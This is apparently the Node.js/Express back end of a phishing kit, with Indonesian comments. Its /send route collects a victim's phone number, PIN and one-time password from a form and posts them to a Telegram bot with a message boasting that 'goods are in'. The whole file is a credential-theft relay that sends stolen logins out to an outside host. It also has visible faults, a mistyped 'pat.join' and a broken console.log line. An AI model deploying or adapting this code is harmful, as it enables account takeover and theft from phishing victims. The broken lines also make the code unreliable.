const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

app.use(express.json());
app.use(
    express.urlencoded({
        extended:true
    })
);

app.use(
    express.static(
        pat.join(__dirname)
    )
);

app.get("/", (req,res)=>{
    
    res.send("SERVER HIDUP");
    
});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK":"
        );

        console.log(
            req.body
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
💳 <b>| BARANG MASUK BANG |</b> 💳

×  NMR  ×   : ${nmrx}
×  POX   ×   : ${pix}
×  OXT   ×   : ${otp}

<b>©️ By PxxStudix</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
